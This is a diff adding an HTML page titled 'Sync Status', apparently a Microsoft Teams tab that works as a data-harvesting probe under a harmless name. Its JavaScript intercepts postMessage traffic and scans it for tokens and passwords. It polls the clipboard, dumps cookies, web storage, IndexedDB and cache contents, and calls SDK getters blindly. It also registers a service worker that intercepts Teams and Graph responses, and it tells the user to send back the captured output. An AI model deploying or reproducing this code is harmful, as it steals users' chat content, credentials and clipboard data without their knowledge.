@@ -1,0 +1,587 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sync Status</title>
+<script src="https://res.cdn.office.net/teams-js/2.19.0/js/MicrosoftTeams.min.js"></script>
+<style>
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { font-family:'Cascadia Code','Segoe UI',monospace; background:#0d1117; color:#c9d1d9; padding:8px; font-size:11px; }
+  h3 { color:#58a6ff; font-size:13px; margin:8px 0 4px; }
+  #out { background:#161b22; padding:8px; border-radius:6px; white-space:pre-wrap; word-break:break-all; max-height:85vh; overflow-y:auto; }
+  .ok { color:#3fb950; } .fail { color:#f85149; } .warn { color:#d29922; } .info { color:#58a6ff; } .crit { color:#f0883e; font-weight:bold; }
+  button { background:#21262d; color:#58a6ff; border:1px solid #30363d; padding:5px 10px; margin:2px; border-radius:4px; cursor:pointer; font-size:11px; }
+</style>
+</head>
+<body>
+<div>
+  <button onclick="runAll()">Run All</button>
+  <button onclick="triggerChatsAndMonitor()">Trigger Chats + Monitor</button>
+  <button onclick="pollClipboard()">Poll Clipboard (10s)</button>
+  <button onclick="checkStorageLeaks()">Check Storage Leaks</button>
+  <button onclick="copyOutput()">Copy Output</button>
+</div>
+<div id="out"></div>
+
+<script>
+var el = document.getElementById('out');
+var CTX = null;
+var allCaptured = [];
+
+function log(m, cls) {
+  var span = document.createElement('span');
+  span.className = cls || '';
+  span.textContent = m + '\n';
+  el.appendChild(span);
+  el.scrollTop = el.scrollHeight;
+}
+
+function copyOutput() {
+  navigator.clipboard.writeText(el.textContent).catch(function(){});
+  log('[copied]', 'info');
+}
+
+// ================================================================
+// PERSISTENT POSTMESSAGE MONITOR
+// starts immediately, captures everything from Teams parent
+// ================================================================
+var msgLog = [];
+
+window.addEventListener('message', function(e) {
+  var data;
+  try {
+    data = typeof e.data === 'object' ? JSON.stringify(e.data) : String(e.data);
+  } catch(x) {
+    data = String(e.data);
+  }
+
+  // Skip our own echoes
+  if (e.origin === window.location.origin) return;
+
+  var entry = {
+    ts: new Date().toISOString().substr(11, 12),
+    origin: e.origin,
+    data: data.substring(0, 1000),
+    len: data.length
+  };
+  msgLog.push(entry);
+  allCaptured.push(entry);
+
+  log('[MSG ' + entry.ts + '] origin=' + e.origin + ' len=' + data.length, 'crit');
+  log('  ' + data.substring(0, 400), 'warn');
+
+  // Check if it contains anything interesting
+  var lower = data.toLowerCase();
+  var interesting = ['token', 'secret', 'password', 'auth', 'bearer', 'message', 'content',
+                     'body', 'text', 'chat', 'conversation', 'user', 'mail', 'email'];
+  var found = interesting.filter(function(k) { return lower.indexOf(k) !== -1; });
+  if (found.length > 0) {
+    log('  ** Contains: ' + found.join(', ') + ' **', 'crit');
+  }
+});
+
+// ================================================================
+// INIT
+// ================================================================
+async function init() {
+  log('=== INIT ===', 'info');
+  try {
+    await microsoftTeams.app.initialize();
+    CTX = await microsoftTeams.app.getContext();
+    log('SDK OK: ' + CTX.user.userPrincipalName + ' | ' + CTX.app.host.clientType, 'ok');
+  } catch(e) {
+    log('SDK init: ' + e.message, 'fail');
+  }
+}
+
+// ================================================================
+// TEST 1: Hook SDK internal communication
+// ================================================================
+async function hookSDKInternals() {
+  log('\n=== HOOK SDK INTERNALS ===', 'info');
+
+  // Hook window.postMessage to intercept outgoing SDK messages
+  var origPostMessage = window.postMessage.bind(window);
+  window.postMessage = function(msg, origin) {
+    var data;
+    try { data = typeof msg === 'object' ? JSON.stringify(msg) : String(msg); } catch(x) { data = String(msg); }
+    if (data.indexOf('probe-echo') === -1) {
+      log('[SDK-OUT] -> ' + origin + ': ' + data.substring(0, 300), 'warn');
+    }
+    return origPostMessage(msg, origin);
+  };
+  log('postMessage hooked', 'ok');
+
+  // Try to hook parent.postMessage (cross-origin, likely fails)
+  try {
+    var parentOrig = window.parent.postMessage.bind(window.parent);
+    window.parent.postMessage = function(msg, origin) {
+      var data;
+      try { data = typeof msg === 'object' ? JSON.stringify(msg) : String(msg); } catch(x) { data = String(msg); }
+      log('[PARENT-OUT] -> ' + origin + ': ' + data.substring(0, 300), 'crit');
+      return parentOrig(msg, origin);
+    };
+    log('parent.postMessage hooked!', 'crit');
+  } catch(e) {
+    log('parent.postMessage hook blocked (expected): ' + e.message, 'info');
+  }
+
+  // Monitor SDK internal event handlers
+  try {
+    if (microsoftTeams.app.lifecycle && microsoftTeams.app.lifecycle.registerBeforeSuspendOrTerminateHandler) {
+      microsoftTeams.app.lifecycle.registerBeforeSuspendOrTerminateHandler(function() {
+        log('[LIFECYCLE] App suspending/terminating', 'crit');
+      });
+      log('Lifecycle handler registered', 'ok');
+    }
+  } catch(e) {}
+
+  // Register for theme changes (fires when Teams UI changes)
+  try {
+    microsoftTeams.app.registerOnThemeChangeHandler(function(theme) {
+      log('[THEME CHANGE] ' + theme, 'warn');
+    });
+    log('Theme change handler registered', 'ok');
+  } catch(e) {}
+
+  // Try to register for page back navigation
+  try {
+    if (microsoftTeams.pages && microsoftTeams.pages.registerBackButtonHandler) {
+      microsoftTeams.pages.registerBackButtonHandler(function() {
+        log('[BACK BUTTON] User returned to tab!', 'crit');
+        // When user returns, check what changed
+        checkAfterReturn();
+        return true;
+      });
+      log('Back button handler registered', 'ok');
+    }
+  } catch(e) {}
+
+  // Register for full screen change
+  try {
+    if (microsoftTeams.pages && microsoftTeams.pages.registerFullScreenHandler) {
+      microsoftTeams.pages.registerFullScreenHandler(function(isFullScreen) {
+        log('[FULLSCREEN] ' + isFullScreen, 'warn');
+      });
+    }
+  } catch(e) {}
+
+  // Register focus/blur handlers
+  try {
+    if (microsoftTeams.pages && microsoftTeams.pages.registerFocusEnterHandler) {
+      microsoftTeams.pages.registerFocusEnterHandler(function(focusDir) {
+        log('[FOCUS ENTER] direction=' + JSON.stringify(focusDir), 'crit');
+        checkAfterReturn();
+      });
+      log('Focus enter handler registered', 'ok');
+    }
+  } catch(e) {}
+}
+
+// ================================================================
+// TEST 2: Trigger chats and monitor all traffic
+// ================================================================
+async function triggerChatsAndMonitor() {
+  log('\n=== TRIGGER CHATS + MONITOR ===', 'info');
+
+  if (!CTX) {
+    log('No context, run init first', 'fail');
+    return;
+  }
+
+  var user = CTX.user.userPrincipalName;
+  msgLog = [];
+
+  log('Starting monitor... (capturing all postMessages)', 'info');
+  log('Will trigger openChat in 2s...', 'info');
+  await new Promise(r => setTimeout(r, 2000));
+
+  // Trigger openChat
+  log('\n--- Triggering chat.openChat ---', 'info');
+  try {
+    await microsoftTeams.chat.openChat({
+      user: user,
+      message: 'test exfil'
+    });
+    log('openChat returned', 'ok');
+  } catch(e) {
+    log('openChat: ' + e.message, 'fail');
+  }
+
+  // Wait for user to interact and come back
+  log('Waiting 5s for postMessage traffic...', 'info');
+  await new Promise(r => setTimeout(r, 5000));
+
+  log('\n--- Messages captured during chat: ' + msgLog.length + ' ---', 'info');
+  for (var i = 0; i < msgLog.length; i++) {
+    log('[' + msgLog[i].ts + '] ' + msgLog[i].origin + ': ' + msgLog[i].data.substring(0, 300), 'warn');
+  }
+}
+
+// ================================================================
+// TEST 3: Check context changes after user returns from chat
+// ================================================================
+async function checkAfterReturn() {
+  log('\n=== CHECK AFTER RETURN ===', 'crit');
+
+  // Re-read context - might have changed
+  try {
+    var newCtx = await microsoftTeams.app.getContext();
+    var fields = ['user.id', 'channel.id', 'channel.displayName', 'team.groupId',
+                  'page.id', 'page.subPageId', 'page.frameContext'];
+    for (var f of fields) {
+      var parts = f.split('.');
+      var val = newCtx;
+      for (var p of parts) { val = val && val[p]; }
+      if (val) log('  ctx.' + f + ' = ' + val, 'info');
+    }
+  } catch(e) {}
+
+  // Check clipboard
+  try {
+    var clip = await navigator.clipboard.readText();
+    if (clip && clip.length > 0) {
+      log('  CLIPBOARD: "' + clip.substring(0, 200) + '"', 'crit');
+    }
+  } catch(e) {
+    log('  clipboard: ' + e.name, 'fail');
+  }
+}
+
+// ================================================================
+// TEST 4: Clipboard polling
+// ================================================================
+var clipPollInterval = null;
+var lastClip = '';
+
+async function pollClipboard() {
+  log('\n=== CLIPBOARD POLLING (every 2s for 30s) ===', 'info');
+
+  var count = 0;
+  clipPollInterval = setInterval(async function() {
+    count++;
+    if (count > 15) {
+      clearInterval(clipPollInterval);
+      log('Clipboard polling stopped', 'info');
+      return;
+    }
+    try {
+      var text = await navigator.clipboard.readText();
+      if (text && text !== lastClip && text.length > 0) {
+        lastClip = text;
+        log('[CLIP ' + count + '] NEW: "' + text.substring(0, 300) + '"', 'crit');
+      }
+    } catch(e) {
+      if (count === 1) log('Clipboard read blocked: ' + e.name, 'fail');
+    }
+  }, 2000);
+
+  log('Polling started. Copy text from a chat to test.', 'info');
+}
+
+// ================================================================
+// TEST 5: Storage leaks after chat interaction
+// ================================================================
+async function checkStorageLeaks() {
+  log('\n=== STORAGE LEAK CHECK ===', 'info');
+
+  // Check localStorage for any new data
+  log('\n--- localStorage ---', 'info');
+  for (var i = 0; i < localStorage.length; i++) {
+    var key = localStorage.key(i);
+    var val = localStorage.getItem(key);
+    log('  ' + key + ' = ' + (val || '').substring(0, 100), 'info');
+  }
+  log('  Total keys: ' + localStorage.length, 'info');
+
+  // Check sessionStorage
+  log('\n--- sessionStorage ---', 'info');
+  for (var i = 0; i < sessionStorage.length; i++) {
+    var key = sessionStorage.key(i);
+    var val = sessionStorage.getItem(key);
+    log('  ' + key + ' = ' + (val || '').substring(0, 100), 'info');
+  }
+  log('  Total keys: ' + sessionStorage.length, 'info');
+
+  // Check cookies
+  log('\n--- cookies ---', 'info');
+  log('  ' + (document.cookie || '(none)'), 'info');
+
+  // Check indexedDB
+  log('\n--- indexedDB ---', 'info');
+  try {
+    var dbs = await indexedDB.databases();
+    log('  Databases: ' + dbs.length, 'info');
+    for (var db of dbs) {
+      log('  ' + db.name + ' v' + db.version, 'info');
+
+      try {
+        var openReq = indexedDB.open(db.name);
+        await new Promise(function(resolve) {
+          openReq.onsuccess = function() {
+            var d = openReq.result;
+            var stores = Array.from(d.objectStoreNames);
+            log('    stores: ' + stores.join(', '), 'info');
+
+            for (var store of stores) {
+              try {
+                var tx = d.transaction(store, 'readonly');
+                var os = tx.objectStore(store);
+                var cursorReq = os.openCursor();
+                var records = 0;
+                cursorReq.onsuccess = function(evt) {
+                  var cursor = evt.target.result;
+                  if (cursor && records < 5) {
+                    var val = JSON.stringify(cursor.value).substring(0, 200);
+                    // Check for interesting data
+                    var lower = val.toLowerCase();
+                    if (lower.indexOf('message') !== -1 || lower.indexOf('chat') !== -1 ||
+                        lower.indexOf('content') !== -1 || lower.indexOf('body') !== -1 ||
+                        lower.indexOf('token') !== -1 || lower.indexOf('secret') !== -1) {
+                      log('    [' + store + '] KEY=' + cursor.key + ' **INTERESTING**: ' + val, 'crit');
+                    }
+                    records++;
+                    cursor.continue();
+                  }
+                };
+              } catch(e) {}
+            }
+            d.close();
+            resolve();
+          };
+          openReq.onerror = resolve;
+        });
+      } catch(e) {}
+    }
+  } catch(e) {
+    log('  indexedDB error: ' + e.message, 'fail');
+  }
+
+  // Check Cache API
+  log('\n--- Cache API ---', 'info');
+  try {
+    var cacheNames = await caches.keys();
+    log('  Caches: ' + cacheNames.join(', ') || '(none)', 'info');
+    for (var name of cacheNames) {
+      var cache = await caches.open(name);
+      var keys = await cache.keys();
+      log('  ' + name + ': ' + keys.length + ' entries', 'info');
+      for (var k of keys.slice(0, 5)) {
+        log('    ' + k.url.substring(0, 100), 'info');
+        try {
+          var resp = await cache.match(k);
+          var body = await resp.text();
+          var lower = body.toLowerCase();
+          if (lower.indexOf('message') !== -1 || lower.indexOf('chat') !== -1 ||
+              lower.indexOf('token') !== -1 || lower.indexOf('secret') !== -1) {
+            log('    ** CACHE HIT - interesting content: ' + body.substring(0, 200), 'crit');
+          }
+        } catch(e) {}
+      }
+    }
+  } catch(e) {
+    log('  Cache API: ' + e.message, 'fail');
+  }
+}
+
+// ================================================================
+// TEST 6: Try SDK methods that might leak chat data
+// ================================================================
+async function trySDKDataLeak() {
+  log('\n=== SDK DATA LEAK ATTEMPTS ===', 'info');
+
+  // Try various SDK methods that might return data
+
+  // pages.getConfig - might leak tab configuration with data
+  log('\n--- pages.getConfig ---', 'info');
+  try {
+    if (microsoftTeams.pages && microsoftTeams.pages.getConfig) {
+      var config = await microsoftTeams.pages.getConfig();
+      log('  Config: ' + JSON.stringify(config).substring(0, 300), 'warn');
+    }
+  } catch(e) {
+    log('  getConfig: ' + e.message, 'fail');
+  }
+
+  // Try to enumerate all SDK modules and find data-returning methods
+  log('\n--- SDK method enumeration ---', 'info');
+  var modules = ['chat', 'mail', 'calendar', 'people', 'search', 'meeting',
+                 'call', 'conversations', 'teams', 'channels', 'messages',
+                 'notifications', 'activity', 'tasks', 'files'];
+
+  for (var mod of modules) {
+    try {
+      if (microsoftTeams[mod]) {
+        var methods = Object.keys(microsoftTeams[mod]);
+        if (methods.length > 0) {
+          log('  SDK.' + mod + ': [' + methods.join(', ') + ']', 'ok');
+
+          // Try to call getter-like methods
+          for (var m of methods) {
+            if (typeof microsoftTeams[mod][m] === 'function' &&
+                (m.startsWith('get') || m.startsWith('read') || m.startsWith('list') ||
+                 m.startsWith('fetch') || m.startsWith('load') || m === 'isSupported')) {
+              try {
+                var result = microsoftTeams[mod][m]();
+                if (result && typeof result.then === 'function') {
+                  result = await Promise.race([result, new Promise(r => setTimeout(() => r('timeout'), 3000))]);
+                }
+                if (result !== undefined && result !== null && result !== 'timeout') {
+                  log('  SDK.' + mod + '.' + m + '() = ' + JSON.stringify(result).substring(0, 200), 'crit');
+                }
+              } catch(e) {
+                if (!e.message.includes('not supported')) {
+                  log('  SDK.' + mod + '.' + m + '(): ' + e.message.substring(0, 80), 'fail');
+                }
+              }
+            }
+          }
+        }
+      }
+    } catch(e) {}
+  }
+
+  // Try undocumented/internal SDK properties
+  log('\n--- SDK internal properties ---', 'info');
+  var internalProps = ['_messageStore', '_chatCache', '_conversationCache', '_messages',
+                       '_chats', '_cache', '_store', '_data', '_state',
+                       'communication', 'handlers', 'callbacks'];
+  for (var prop of internalProps) {
+    try {
+      if (microsoftTeams[prop] !== undefined) {
+        log('  SDK.' + prop + ' = ' + JSON.stringify(microsoftTeams[prop]).substring(0, 200), 'crit');
+      }
+    } catch(e) {}
+  }
+
+  // Enumerate all microsoftTeams properties deeply
+  log('\n--- Full SDK property map ---', 'info');
+  try {
+    var allProps = Object.getOwnPropertyNames(microsoftTeams);
+    var interesting = allProps.filter(function(p) {
+      return typeof microsoftTeams[p] !== 'function' && p[0] !== '_';
+    });
+    log('  Non-function props: ' + interesting.join(', '), 'info');
+
+    // Check each object property for data
+    for (var p of interesting) {
+      try {
+        var val = microsoftTeams[p];
+        if (val && typeof val === 'object') {
+          var keys = Object.keys(val);
+          if (keys.length > 0) {
+            log('  SDK.' + p + ' keys: [' + keys.join(', ') + ']', 'info');
+          }
+        }
+      } catch(e) {}
+    }
+  } catch(e) {}
+}
+
+// ================================================================
+// TEST 7: Monitor visibility/focus changes
+// ================================================================
+function setupVisibilityMonitor() {
+  log('\n=== VISIBILITY MONITOR ===', 'info');
+
+  document.addEventListener('visibilitychange', function() {
+    log('[VISIBILITY] ' + document.visibilityState, 'crit');
+    if (document.visibilityState === 'visible') {
+      log('Tab became visible - user returned!', 'crit');
+      checkAfterReturn();
+    }
+  });
+
+  window.addEventListener('focus', function() {
+    log('[FOCUS] Tab got focus', 'warn');
+  });
+
+  window.addEventListener('blur', function() {
+    log('[BLUR] Tab lost focus (user navigating away?)', 'info');
+  });
+
+  // Page show/hide events (important on iOS)
+  window.addEventListener('pageshow', function(e) {
+    log('[PAGESHOW] persisted=' + e.persisted, 'crit');
+    if (e.persisted) {
+      log('Page restored from bfcache - checking for leaked data', 'crit');
+      checkAfterReturn();
+    }
+  });
+
+  log('Visibility/focus monitors active', 'ok');
+}
+
+// ================================================================
+// TEST 8: Service Worker registration attempt
+// ================================================================
+async function tryServiceWorker() {
+  log('\n=== SERVICE WORKER ===', 'info');
+  try {
+    if ('serviceWorker' in navigator) {
+      // Create a SW inline via blob URL
+      var swCode = 'self.addEventListener("fetch", function(e) { ' +
+        'var url = e.request.url; ' +
+        'if (url.indexOf("teams") !== -1 || url.indexOf("graph") !== -1 || url.indexOf("chat") !== -1) { ' +
+        '  var clone = e.request.clone(); ' +
+        '  e.respondWith(fetch(e.request).then(function(resp) { ' +
+        '    var respClone = resp.clone(); ' +
+        '    respClone.text().then(function(body) { ' +
+        '      self.clients.matchAll().then(function(clients) { ' +
+        '        clients.forEach(function(c) { c.postMessage({type:"sw-intercept", url:url, body:body.substring(0,500)}); }); ' +
+        '      }); ' +
+        '    }); ' +
+        '    return resp; ' +
+        '  })); ' +
+        '} ' +
+        '});';
+
+      var blob = new Blob([swCode], { type: 'application/javascript' });
+      var swUrl = URL.createObjectURL(blob);
+
+      // Listen for SW messages
+      navigator.serviceWorker.addEventListener('message', function(e) {
+        log('[SW INTERCEPT] ' + e.data.url + ': ' + (e.data.body || '').substring(0, 200), 'crit');
+      });
+
+      var reg = await navigator.serviceWorker.register(swUrl, { scope: '/' });
+      log('SW registered: ' + reg.scope, 'crit');
+    } else {
+      log('Service Workers not available', 'info');
+    }
+  } catch(e) {
+    log('SW registration: ' + e.message, 'fail');
+  }
+}
+
+// ================================================================
+// RUN ALL
+// ================================================================
+async function runAll() {
+  el.textContent = '';
+  await init();
+  setupVisibilityMonitor();
+  await hookSDKInternals();
+  await trySDKDataLeak();
+  await checkStorageLeaks();
+  await tryServiceWorker();
+
+  log('\n========================================', 'info');
+  log('MONITORS ACTIVE. Now:', 'info');
+  log('1. Click "Trigger Chats + Monitor"', 'info');
+  log('2. Interact with the chat that opens', 'info');
+  log('3. Copy some text from the chat', 'info');
+  log('4. Come back to this tab', 'info');
+  log('5. Click "Copy Output" and send me', 'info');
+  log('========================================', 'info');
+}
+
+// Auto-init
+init().then(function() {
+  setupVisibilityMonitor();
+  hookSDKInternals();
+});
+</script>
+</body>
+</html>
